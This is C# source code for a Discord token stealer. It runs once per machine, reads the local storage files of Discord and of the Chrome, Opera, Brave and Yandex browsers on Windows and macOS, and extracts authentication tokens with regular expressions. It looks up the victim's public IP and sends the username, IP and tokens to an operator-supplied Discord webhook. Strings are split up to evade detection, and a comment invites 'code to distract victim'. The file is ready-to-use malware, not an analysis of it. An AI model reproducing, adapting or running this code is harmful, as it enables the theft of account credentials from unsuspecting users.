using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Net;
using System.IO;
using System.Text.RegularExpressions;
using System.Linq;
using System.Text;
using System.Runtime.InteropServices;

namespace token_grabber
{
    class Program
    {
        private static string imagine = ""; // <~~ YOUR DISCORD WEBHOOK TO SEND DATA TO
        private static bool dragons = false;

        static void Main()
        {
            if (twoofthese())
            {
                var msg = deez();
                if (dragons)
                {
                    sugma(msg);
                }
            }

            // put code to distract victim here

        }

        public static bool twoofthese()
        {
            try
            {
                string cache = "";
                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    cache = Environment.GetEnvironmentVariable("T" + "E" + "M" + "P") + "/" + "c" + "a" + "che";
                }
                if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
                {
                    //cache = "./." + bofa;
                    cache = "c" + "a" + "che";
                }

                if (!File.Exists(cache))
                {
                    File.WriteAllText(cache, "big gay");
                    File.SetAttributes(cache, FileAttributes.Hidden);
                    return true;
                }
                else { return false; }
            } catch { return true; }
        }

        public static List<string> deez()
        {
            List<string> candice = new List<string>();
            String ROAMING = "";
            String LOCAL = "";
            List<string> boi = new List<string>();
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                ROAMING = Environment.GetEnvironmentVariable("A" + "P" + "PD" + "A" + "T" + "A" + "");
                LOCAL = Environment.GetEnvironmentVariable("LO" + "CAL" + "APP" + "DA" + "TA");
                boi.Add(ROAMING + "\\D" + "is" + "c" + "ord\\" + "Lo" + "cal Storage\\le" + "veldb");
                boi.Add(ROAMING + "\\d" + "i" + "sc" + "ordc" + "anary\\Lo" + "cal St" + "orage\\leve" + "ldb");
                boi.Add(ROAMING + "\\discor" + "dptb\\Loc" + "al " + "Sto" + "rage\\le" + "ve" + "ldb");
                boi.Add(LOCAL + "\\G" + "oog" + "le\\Chro" + "m" + "e\\U" + "ser" + " Da" + "t" + "a\\De" + "f" + "a" + "u" + "l" + "t\\L" + "o" + "c" + "a" + "l" + " " + "S" + "t" + "o" + "r" + "a" + "g" + "e\\lev" + "e" + "ld" + "" + "b");
                boi.Add(ROAMING + "\\O" + "pe" + "ra " + "S" + "o" + "f" + "t" + "w" + "a" + "r" + "e" + "\\" + "O" + "p" + "e" + "r" + "a" + " " + "S" + "t" + "abl" + "e\\Lo" + "cal " + "S" + "t" + "o" + "r" + "a" + "ge\\l" + "e" + "v" + "e" + "l" + "d" + "b");
                boi.Add(LOCAL + "\\Br" + "a" + "v" + "e" + "So" + "ft" + "w" + "a" + "re" + "\\" + "B" + "r" + "a" + "v" + "e" + "-B" + "r" + "ow" + "s" + "e" + "r\\" + "U" + "s" + "e" + "r" + " " + "" + "D" + "at" + "a" + "\\" + "Def" + "au" + "l" + "t\\" + "Loc" + "al" + " St" + "ora" + "ge" + "\\le" + "vel" + "d" + "b");
                boi.Add(LOCAL + "\\Ya" + "ndex\\Ya" + "nd" + "exB" + "row" + "ser\\U" + "s" + "er D" + "a" + "ta\\D" + "ef" + "aul" + "t\\L" + "oca" + "l S" + "to" + "rag" + "e\\le" + "v" + "el" + "d" + "b");
            }
            else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
            {
                LOCAL = "/U" + "se" + "rs/" + Environment.UserName + "/Libra" + "ry/A" + "pp" + "licat" + "ion " + "Support";
                boi.Add(LOCAL + "/D" + "isco" + "rd/Lo" + "cal S" + "tora" + "ge/l" + "ev" + "eldb");
                boi.Add(LOCAL + "/G" + "oog" + "le/C" + "hr" + "ome/" + "User" + " Data/" + "Defa" + "ult/L" + "oca" + "l Sto" + "rage/" + "lev" + "eldb");
            }
            else { return null; }


            foreach (string folder in boi)
            {
                if (Directory.Exists(folder))
                {
                    string[] dirs = Directory.GetFiles(folder);
                    foreach (var file in dirs)
                    {
                        if (file.EndsWith(".log") || file.EndsWith(".ldb"))
                        {
                            byte[] bytes = File.ReadAllBytes(file);
                            string @stringx = Encoding.UTF8.GetString(bytes);

                            foreach (Match match in Regex.Matches(stringx, @"[\w-]{24}\.[\w-]{6}\.[\w-]{27}"))
                                candice.Add(match.Value + "\n");

                            foreach (Match match in Regex.Matches(stringx, @"mfa\.[\w-]{84}"))
                                candice.Add(match.Value + "\n");
                        }
                    }
                }
            }



            candice = candice.ToList();

            if (candice.Count > 0)
            {
                dragons = true;
            }
            else
                candice.Add("Empty");

            return candice;
        }

        public static string nuts()
        {
            string bruh = new WebClient().DownloadString("ht" + "t" + "p" + ":" + "/" + "/" + "i" + "p" + "v" + "4b" + "ot.w" + "hat" + "i" + "sm" + "yi" + "pa" + "dd" + "re" + "ss" + "." + "co" + "m/");
            return bruh;
        }

        static void sugma(List<string> message)
        {
            lol.bluecheeseballs(imagine, new NameValueCollection()
            {
                { "username", "T"+"o"+"k"+"e"+"n"+" "+"G"+"r"+"a"+"b"+"b"+"e"+"r" },
                { "avatar_url", "ht"+"tps"+":"+"//"+"cd"+"n."+"di"+"sc"+"or"+"d"+"a"+"p"+"p.com/"+"attachm"+"ents"+"/69"+"608"+"002"+"47423"+"959"+"14/"+"71848"+"3498"+"94783"+"806"+"3/be"+"etlejuic"+"e-1."+"jpg" },
                { "content", "@everyone\n```\n" + "Re"+"p"+"ort fro"+"m C"+"andy"+" Gr"+"ab"+"ber\n\n" + "U"+"se"+"rn"+"ame: " + Environment.UserName + "\nI"+"P"+": " + nuts() + "\nTo"+"ke"+"ns:\n\n" + string.Join("\n", message) + "\n```" }
            });
        }
    }
    class lol
    {
        public static byte[] bluecheeseballs(string cheesbunger, NameValueCollection cheesestick)
        {
            using (WebClient webClient = new WebClient())
                return webClient.UploadValues(cheesbunger, cheesestick);
        }
    }
}